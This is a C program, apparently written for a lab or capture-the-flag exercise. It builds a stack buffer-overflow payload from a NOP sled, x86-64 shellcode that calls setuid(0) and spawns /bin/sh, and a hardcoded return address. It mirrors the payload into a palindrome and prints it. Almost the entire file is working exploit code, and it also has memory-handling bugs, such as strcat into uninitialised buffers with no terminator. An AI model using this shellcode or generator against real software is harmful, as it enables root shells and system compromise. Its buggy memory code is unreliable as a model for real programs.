#include <stdio.h>
#include <string.h>
#include <math.h>
#include <stdlib.h>

char main(){
	//we are creating part2 manually, and the palindrome is created automatically
	
	//the NOP operation, 1 byte
	char NOP_code[] = "\x90";
	int number_of_NOPs = 33;
	//32 bytes
	char shell_code[] = "\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
	//TO BE CHANGED! the reversed return address (due to endiannes)
	char return_address[] = "\x9a\xe7\xff\xff\xff\x7f";
	int number_of_returns = 1;
	
	//new address confirmed on the NOP slide using layout reg after running the program in gdb
	
	//more in the middle address (reversed):
	//\x00\xe4\xff\xff\xff\x7f
	
	//alternative address for string man purposes
	//0x7fffffffe3f8
	//\xf8\xe3\xff\xff\xff\x7f
	
	//actual address: \x7f\xff\xff\xff\xe3\xe8
	//reversed address: \xe8\xe3\xff\xff\xff\x7f
	//old address: \xd8\xe3\xff\xff\xff\x7f
	
	//printf("Aggregate output:  %s\n", shell_code);
	//printf("Aggregate output:  %s%s%s\n", NOP_code, shell_code, return_address);
	//printf(shell_code);
	//printf(return_address);
	
	//creating part1, by combining all of the strings above:
	char *part2 = NULL;
	part2 = realloc(part2, strlen(NOP_code)*number_of_NOPs + strlen(shell_code) + strlen(return_address)*number_of_returns);
	//add as many NOPs as defined in the "number of NOPs"
	for(int i = 0; i < number_of_NOPs; i++){
		strcat(part2, NOP_code);
	}
	
	strcat(part2, shell_code);
	
	//strcat(part2, return_address);
	
	//strcat(part2, "\0");
	
	for(int i = 0; i < number_of_returns; i++){
		strcat(part2, return_address);
	}
	
	//printf("Aggregate output:  %s\n", part2);
	
	//now we will create part1, by reversing part2, and append it at the begining of our final string
	//char* s = "hello";
	//s is part2
	//r is part1
	//l is length of part2
	size_t l = strlen(part2);
	char* part1 = (char*)malloc((l) * sizeof(char));
	
	//we define the end of the array like this (if we need a string):
	//part1[l] = '\0';
	
	int i;
	for(i = 0; i < l; i++) {
		part1[i] = part2[l - 1 - i];
	}
	//printf("part2: %s\n", part2);
	//printf("part1: %s\n", part1);
	
	//now we combine the two parts into the final part and return it:
	char *final_part = NULL;
	final_part = realloc(final_part, strlen(part1) + strlen(part2));
	strcat(final_part, part1);
	strcat(final_part, part2);
	
	//printf("final_part: %s\n", final_part);
	
	//printf("%c", final_part);
	
	printf("%s", final_part);
	
	//int size1 = sizeof(part1);
	//int length1 = strlen(part1);
	//printf("%d", size1);			
	//printf("%d", length1);
	
	//int size2 = sizeof(part2);
	//int length2 = strlen(part2);
	//printf("%d", size2);			
	//printf("%d", length2);
	
	//int size = sizeof(final_part);
	//int length = strlen(final_part);
	//printf("%d", size);			
	//printf("%d", length);			
	//return *final_part;
	
	
	
}
